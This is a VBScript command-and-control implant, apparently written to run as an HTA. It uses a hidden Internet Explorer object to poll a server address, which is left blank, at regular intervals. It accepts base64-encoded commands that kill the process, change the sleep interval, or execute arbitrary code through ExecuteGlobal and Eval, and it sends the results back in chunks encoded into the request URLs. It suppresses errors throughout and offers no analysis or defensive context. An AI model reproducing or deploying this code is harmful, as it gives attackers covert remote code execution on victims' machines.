C2 = "https://"
sleepInterval = 151 * 1000
outBuffer = ""

Function Base64Encode(sText)
    On Error Resume Next
    Dim oXML, oNode

    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue =Stream_StringToBinary(sText)
    Base64Encode = Replace(oNode.text, Chr(10), "")
End Function

Function Base64Decode(ByVal vCode)
 On Error Resume Next
 Set oNode = CreateObject("Msxml2.DOMDocument.3.0").CreateElement("base64")
 oNode.dataType = "bin.base64"
 oNode.text = vCode
 Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
 Set oNode = Nothing
 If Err.Number <> 0 Then
    Base64Decode = ""
 End If
End Function

Function Stream_StringToBinary(Text)
 On Error Resume Next
 Set BinaryStream = CreateObject("ADODB.Stream")
 BinaryStream.Type = 2
 BinaryStream.CharSet = "us-ascii"
 BinaryStream.Open
 BinaryStream.WriteText Text
 BinaryStream.Position = 0
 BinaryStream.Type = 1
 BinaryStream.Position = 0
 Stream_StringToBinary = BinaryStream.Read
 Set BinaryStream = Nothing
End Function

Function Stream_BinaryToString(Binary)
 On Error Resume Next
 Set BinaryStream = CreateObject("ADODB.Stream")
 BinaryStream.Type = 1
 BinaryStream.Open
 BinaryStream.Write Binary
 BinaryStream.Position = 0
 BinaryStream.Type = 2
 BinaryStream.CharSet = "utf-8"
 Stream_BinaryToString = BinaryStream.ReadText
 Set BinaryStream = Nothing
End Function

Function randomCharacter()
    Randomize
    randomCharacter = chr(Int( ( 125 - 0 + 1 ) * Rnd + 1 ))
End Function

Function genName()
    genName = randomCharacter() & randomCharacter()
End Function

Function intToByteString(MultiByte)
    On Error Resume Next
  MultiByte = HEX(MultiByte)
  Dim RS, LMultiByte, Binary
  Const adLongVarBinary = 205
  Set RS = CreateObject("ADODB.Recordset")
  LMultiByte = LenB(MultiByte)
  If LMultiByte>0 Then
    RS.Fields.Append "mBinary", adLongVarBinary, LMultiByte
    RS.Open
    RS.AddNew
      RS("mBinary").AppendChunk MultiByte & ChrB(0)
    RS.Update
    Binary = RS("mBinary").GetChunk(LMultiByte)
  End If
  a = CStr(Binary)
  If Len(a) < 2 Then
    a = Chr(0) & a
  End If
  intToByteString = a
End Function

Function parseMessage(buf)
  On Error Resume Next
    If TypeName(buf) = "String" Then
        If Len(buf) > 0 Then
            buf = Base64Decode(buf) 

            messageLen = Asc(Mid(buf, 1, 1))
            message = Mid(buf, 2, messageLen)
            
            dataLen = CInt("&h" & HEX(Asc(Mid(buf, 1 + messageLen + 1, 1))) & HEX(Asc(Mid(buf, 1 + messageLen + 2, 1))) )
            data = Mid(buf, 1 + messageLen + 3, dataLen)
            
            If message = "kill" Then
                Self.Close
                window.close
            ElseIf message = "sleep" Then
                newInterval = CInt(data)
                If newInterval > 0 Then
                    sleepInterval = newInterval 
                End If
            ElseIf message = "executeglobal" Then
                ExecuteGlobal data
            ElseIf message = "eval" Then
                ret = Cstr(Eval(data))
                outBuffer = outBuffer + ret 
            End If 

        End If 
    End If 
End Function


instanceName = genName() 

Set objIE = CreateObject("InternetExplorer.Application")
objIE.Visible = False
strikes = 0

Function daLoop()
    On Error Resume Next

    If objIE.Busy Then
        strikes = strikes + 1

        If strikes > 2 Then
            objIE.Stop()
            strikes = 0
        End If
    Else
        response = objIE.Document.Body.InnerText
        parseMessage(response)

        objIE.Stop()
        strikes = 0

        If Len(outBuffer) > 0 Then
            chunkSize = 400
            If Len(outBuffer) <= chunkSize Then
                chunk = outBuffer
                outBuffer = ""
            Else
                chunk = Left(outBuffer, chunkSize)
                outBuffer = Right(outBuffer, Len(outBuffer) - chunkSize)
            End If

            b = instanceName & chr(4) & "eval" & intToByteString(Len(chunk)) & chunk 
        Else
            b = instanceName & chr(5) & "sleep" & chr(0) & chr(0)
        End If 
        
        b = Base64Encode(b)
        Replace b, "+", "%2B"
        Replace b, "/", "%2F"
        Replace b, "=", "%3D"
        objIE.Navigate2 C2 & "/" & b, 14
    End If

    a = window.setTimeout("daLoop", sleepInterval, "VBScript")
End Function

daLoop()
